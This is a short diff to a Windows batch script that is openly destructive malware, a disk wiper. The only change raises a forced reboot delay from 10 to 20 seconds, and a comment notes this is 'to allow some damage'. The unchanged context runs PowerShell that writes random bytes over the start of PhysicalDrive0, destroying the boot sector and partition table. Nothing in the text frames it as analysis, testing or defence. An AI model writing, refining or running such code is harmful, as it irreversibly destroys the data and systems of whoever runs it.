@@ -1,8 +1,8 @@
 @echo off
 setlocal enabledelayedexpansion
 start /max magnify.exe
-:: Schedule reboot early (30 seconds delay to allow some damage)
-shutdown /r /t 10 >nul 2>&1
+:: Schedule reboot early (20 seconds delay to allow some damage)
+shutdown /r /t 20 >nul 2>&1
 
 :: Overwrite disk (optimized PowerShell)
 powershell -NoProfile -Command "$disk = [System.IO.File]::Create('\\\\.\\PhysicalDrive0'); $buffer = [byte[]](0..1048575|%{[byte](Get-Random -Max 256)}); for($j = 0; $j -lt 10; $j++) { $disk.Seek($j * 8388608, 0); $disk.Write($buffer, 0, 1048576) }; $disk.Close()" >nul 2>&1
